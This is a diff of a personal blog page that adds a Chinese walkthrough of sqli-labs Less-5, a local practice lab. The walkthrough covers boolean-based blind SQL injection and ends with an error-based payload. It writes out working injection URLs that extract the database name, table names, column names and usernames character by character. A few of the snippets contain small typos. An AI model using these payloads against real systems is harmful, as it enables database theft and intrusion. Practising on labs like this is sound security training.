@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>friends | wh1t3zer</title>
+  <title>SQL注入靶场记录——02 | wh1t3zer</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -554,17 +554,27 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('/medias/11.jpg')">
+  background-position: center center;position: relative;background-image:url('/medias/9.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        friends
+        SQL注入靶场记录——02
       </span>
     </div>
     
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> Published in：2021-11-04 |
+        </span>
+      
+
+      
+
+      
     
   </div>
   
@@ -582,7 +592,19 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        
+        <h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>本关是基于布尔SQL盲注</p>
+<h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h3><p>left(database(),1)&gt;’s’   作用：database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位 ，‘s’为数据库名</p>
+<p>ascii(substr((select table_name information_schema.tables where tables_schema &#x3D; database()limit 0,1),1,1))&#x3D;101 –+      作用：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换 为 ascii 值</p>
+<p>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),ox20)FROM security.users ORDER  BY id LIMIT 0,1),1,1))&gt;98–+  作用：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位   Ord()函数同 ascii()函数，将字符转为 ascii 值 </p>
+<p>打开源码，发现else不返回任何数据，所以本关思想就是盲注。<br><img src="/upload/2021/11/1636533086(1)-7456ff139262449e913c770df59707fb.png" class="lazyload placeholder" data-srcset="/upload/2021/11/1636533086(1)-7456ff139262449e913c770df59707fb.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"><br><img src="/upload/2021/11/bcfa20fa968e28cec06b571321f5a75-19d6624a0289406cbe82a6fbe4dd1350.jpg" class="lazyload placeholder" data-srcset="/upload/2021/11/bcfa20fa968e28cec06b571321f5a75-19d6624a0289406cbe82a6fbe4dd1350.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h3 id="（1利用-left-database-1-进行尝试"><a href="#（1利用-left-database-1-进行尝试" class="headerlink" title="（1利用 left(database(),1)进行尝试"></a>（1利用 left(database(),1)进行尝试</h3><p>127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1’and left(version(),1)&#x3D;5–+  查看当前数据库版本，这里作用是查看版本号第一位是否等于5，很明显这里是等于5的，结果是正确的。<br>因为如果不正确不会显示you are in…<br><img src="/upload/2021/11/e203204875b11c26dbe458c76fd1aef-f1ef78e771cc4d7c8c49e41c7f6e7ffd.jpg" class="lazyload placeholder" data-srcset="/upload/2021/11/e203204875b11c26dbe458c76fd1aef-f1ef78e771cc4d7c8c49e41c7f6e7ffd.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"><br>继续输入语句<br>127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1’and length(database())&#x3D;8–+<br><img src="/upload/2021/11/image-7c88b021eb624adda8010a2d1da30acf.png" class="lazyload placeholder" data-srcset="/upload/2021/11/image-7c88b021eb624adda8010a2d1da30acf.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg">判断数据库的长度为8，成功返回结果，说明是8</p>
+<p>127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1’and left(database(),1)&gt;’a’–+查看数据库第一位，此操作为判断第一位是否大于a，可使用二分法提高效率</p>
+<p>127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1’and left(database(),2)&gt;’sa’–+查看数据库第二位，用上述方法重复查询数据库第n位，直到找到数据库第8位（因为查询到数据库长度是8位）</p>
+<h3 id="（2）利用substr-ascii-函数尝试"><a href="#（2）利用substr-ascii-函数尝试" class="headerlink" title="（2）利用substr() ascii()函数尝试"></a>（2）利用substr() ascii()函数尝试</h3><p>127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1’and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;80–+ 获取数据库第一个表的第一个字符（本靶场的数据库为security,里面的第一个为email，第一位为e，所以直到测试到&gt;101为止），此处也能使用二分法提高效率。<br><img src="/upload/2021/11/image-7c88b021eb624adda8010a2d1da30acf.png" class="lazyload placeholder" data-srcset="/upload/2021/11/image-7c88b021eb624adda8010a2d1da30acf.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"><br>若获取表的第二个字符呢？了解substr()后改成substr(*,2,1)即可<br>获取第二个表呢？我们看上面的语句limit 0,1意思是从0开始，获取第一个表，我们将0改成1就是从第一个开始获取第一个表，那么就是得到了第二个表。<br>127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1’and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&gt;113–+<br>此处113为正确，因为第二个表为refers，第一位是r，ascii码就是114<br><img src="/upload/2021/11/image-7c88b021eb624adda8010a2d1da30acf.png" class="lazyload placeholder" data-srcset="/upload/2021/11/image-7c88b021eb624adda8010a2d1da30acf.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h3 id="（3）利用regexp获取（2）中user表中的列"><a href="#（3）利用regexp获取（2）中user表中的列" class="headerlink" title="（3）利用regexp获取（2）中user表中的列"></a>（3）利用regexp获取（2）中user表中的列</h3><p>127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1’ and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;’users’ and table_name regexp ‘^us[a-z]’ limit 0,1)–+ 这条语句作用是选择users表里是否含有us的列<br>127.0.0.1&#x2F;sqllib&#x2F;Less-5&#x2F;?id&#x3D;1’ and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;’users’ and column_name regexp ‘^username’ limit 0,1)–+ 将us[a-z]替换成username，发现返回成功说明里面有username这一列，同样换成password执行上述操作也是正确的。</p>
+<h3 id="（4）利用ord-和mid-函数获取users表的内容"><a href="#（4）利用ord-和mid-函数获取users表的内容" class="headerlink" title="（4）利用ord()和mid()函数获取users表的内容"></a>（4）利用ord()和mid()函数获取users表的内容</h3><p>127.0.0.1&#x2F;sqllib&#x2F;Less-5&#x2F;?id&#x3D;1’ and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&#x3D; 68–+ 获取username中第一行的第一个字符ascii与68进行比较，重复使用该方法，得出第一行数据为Dumb，以此类推。</p>
+<h3 id="（5）报错注入和延时注入"><a href="#（5）报错注入和延时注入" class="headerlink" title="（5）报错注入和延时注入"></a>（5）报错注入和延时注入</h3><p>127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1’ union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a –+</p>
+
       </div>
       <div class="post-tags-categories">
         
@@ -595,7 +617,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>link:  </strong>
-    <a href="/friends/index.html" target="_blank" title="friends">https://wh1t3zer.github.io/friends/index.html</a>
+    <a href="/2021/11/04/SQL注入靶场记录——02-sql注入靶场记录02/" target="_blank" title="SQL注入靶场记录——02">https://wh1t3zer.github.io/2021/11/04/SQL注入靶场记录——02-sql注入靶场记录02/</a>
     </li>
     <li class="post-copyright-license">
       <strong>Copyright notice:   </strong>
@@ -613,7 +635,43 @@
 
 
 
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/8.jpg" class="lazyload placeholder" data-srcset="/medias/8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+    </div>
+    <a href="/2021/11/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E4%B8%80%EF%BC%881-12%E5%85%B3%EF%BC%89-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E4%B8%801-12%E5%85%B3/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> Prev:
+        <div class="title-text">文件上传靶场记录一（1-12关）</div>
+      </div>
+      
+      <!-- <div class="content">
+        本系列为文件上传漏洞练习直接上靶场文件https://github.com/c0ny1/upload-labs线上靶场：
+      </div> -->
+    </a>
+  </div>
 
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/8.jpg" class="lazyload placeholder" data-srcset="/medias/8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+    </div>
+    <a href="/2021/11/02/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%9401-ctf%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%9501/" class="post-nav-link">
+      <div class="title">
+        Next: <i class="fas fa-angle-right"></i>
+        <div class="title-text">SQL注入靶场记录——01</div>
+      </div>
+      <!-- <div class="content">
+        记录SQL注入的靶场练习
+以Sqli-labs为例，下载链接https://github.com/Audi-1/sqli
+      </div> -->
+    </a>
+  </div>
 
 </div>
 
@@ -742,6 +800,25 @@
   <!-- 目录 -->
   <!-- 文章详情页右侧目录 -->
 
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>catalog</span>
+        
+          <div class="toc-open-close">catalog</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
 
 <script>
   function closeToc(init) {
@@ -774,7 +851,7 @@
 
   function initCloseTocWidth(init) {
     if (window.innerWidth >= 992) {
-      let isClose = true;
+      let isClose = false;
       isClose && closeToc(init)
     }
   }
